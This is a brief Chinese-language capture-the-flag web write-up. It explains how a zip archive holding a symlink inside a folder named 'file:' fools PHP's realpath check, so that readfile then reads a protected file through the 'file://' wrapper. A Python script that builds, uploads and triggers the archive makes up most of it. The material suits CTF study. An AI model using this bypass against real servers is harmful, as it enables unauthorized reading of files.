tags:: CTFWEB/Zip

- # 思路
	- 使用zip创建软链接欺骗realpath函数，让realpath将一个伪协议解析成一个路径，从而使用伪协议操纵readfile函数读取flag
- # 欺骗realpath
	- realpath: 不会解析伪协议，会将软链接解析成实际的路径
	- readfile: 会解析伪协议
	- 可以创建一个`file:`文件夹，其中放置一个软链接`flag.txt`指向`/var/www/html/index.php`，欺骗realpath将`file:///flag.txt`解析成`/var/www/html/index.php`，从而绕过正则匹配
- # zip软链接构造
	- 参考[[CTFWEB/Zip]]
	- ```python
	  shell.exec(
	      "sudo mkdir /var/www/html; sudo touch index.php; sudo mkdir 'file:'; sudo ln -s /var/www/html/index.php file:/flag.txt; zip file.zip --symlinks file:/flag.txt"
	  )
	  with open("file.zip", "rb") as f:
	      r = base_post(url, files={"file": ("a.zip", f)})
	  
	  shell.exec("rm file.zip; sudo rm /var/www/html/index.php; sudo rm file:/flag.txt; sudo rm -d file:/")
	  
	  r = base_get(url, params = {
	      "file": "file:///flag.txt"
	  })
	  print(r.text)
	  
	  ```